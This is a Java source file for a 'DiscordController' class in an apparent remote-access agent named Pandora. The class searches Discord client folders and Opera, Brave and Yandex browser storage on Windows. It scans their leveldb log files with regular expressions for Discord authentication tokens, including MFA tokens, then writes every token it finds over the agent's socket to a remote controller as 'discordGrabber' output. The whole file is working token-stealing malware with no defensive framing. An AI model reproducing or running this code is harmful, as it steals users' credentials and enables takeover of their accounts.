package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.util.HashMap;
import java.util.Objects;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordController {

    private final Client client;
    private final HashMap<String, String> paths;
    private final String regex2AF;
    private final String regexNormal;
    private final String roaming;
    private final String local;
    private String result;

    public DiscordController(final Client client) {
        this.client = client;
        this.paths = new HashMap<>();
        this.regex2AF = "mfa\\.[\\w-]{84}";
        this.regexNormal = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}";
        this.roaming = System.getenv("APPDATA");
        this.local = System.getenv("LOCALAPPDATA");
        this.result = "";
        this.paths.put("Discord", this.roaming + "\\discord");
        this.paths.put("Discord Canary", this.roaming + "\\discordcanary");
        this.paths.put("Discord PTB", this.roaming + "\\discordptb");
        this.paths.put("Discord Dev", this.roaming + "\\discorddevelopment");
        this.paths.put("Discord2", this.roaming + "\\Discord");
        this.paths.put("Discord Canary2", this.roaming + "\\Discord Canary");
        this.paths.put("Discord PTB2", this.roaming + "\\Discord PTB");
        this.paths.put("Discord Dev2", this.roaming + "\\Discord Development");
        this.paths.put("Opera", this.roaming + "\\Opera Software\\Opera Stable");
        this.paths.put("Brave", this.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        this.paths.put("Yandex", this.local + "\\Yandex\\YandexBrowser\\User Data\\Default");
    }

    public void execute(final String requestId) {
        this.result = "";
        if (!new File(this.local + "\\DiscordDevelopment").exists() && !new File(this.local + "\\Discord").exists() && !new File(this.local + "\\DiscordCanary").exists() && !new File(this.local + "\\DiscordPTB").exists())
            this.result = "No result found.";
        else this.addAllTokens();
        if (this.result.equals("")) this.result = "No result found.";
        this.client.getSocketUtils().write("discordGrabber:" + requestId + ":" + this.result.replace(":", "(doubleDot)"));
    }

    private void addAllTokens() {
        for (String path : this.paths.values()) {
            path += "\\Local Storage\\leveldb\\";
            final File folder = new File(path);
            if (folder.exists()) {
                final File[] files = folder.listFiles();
                for (final File file : Objects.requireNonNull(files)) {
                    if (file.isFile()) {
                        String name = file.getName();
                        if (name.endsWith(".log") | name.endsWith(".ldb")) {
                            Scanner scanner = null;
                            try {
                                scanner = new Scanner(new BufferedReader(new FileReader(file)));
                            } catch (final FileNotFoundException ignore) {
                            }
                            final StringBuilder content = new StringBuilder();
                            while (scanner != null && scanner.hasNext()) content.append(scanner.next());
                            String strContent = content.toString();
                            this.patternFinder(this.regexNormal, strContent);
                            this.patternFinder(this.regex2AF, strContent);
                        }
                    }
                }
            }
        }
    }

    private void patternFinder(String regex, String content) {
        final Pattern pattern = Pattern.compile(regex);
        final Matcher matcher = pattern.matcher(content);
        if (matcher.find()) {
            String token = matcher.group(0);
            if ((token.startsWith("O") || token.startsWith("N") || token.startsWith("mfa") || token.startsWith("M")))
                if (!this.result.contains(token)) this.result = this.result + "(NEWLINE)" + token;
        }
    }
}
